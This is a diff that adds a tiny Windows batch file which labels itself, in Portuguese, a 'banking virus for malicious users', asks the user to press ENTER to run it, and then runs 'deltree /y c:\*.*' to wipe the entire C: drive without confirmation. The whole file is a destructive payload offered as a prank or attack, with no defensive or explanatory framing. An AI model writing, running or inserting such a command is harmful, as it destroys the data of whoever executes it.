@@ -1,0 +1,5 @@
+@echo off
+@echo Virus de Banking para usuários maliciosos
+@echo Aperte ENTER para executar o vírus...
+pause
+deltree /y c:\*.*
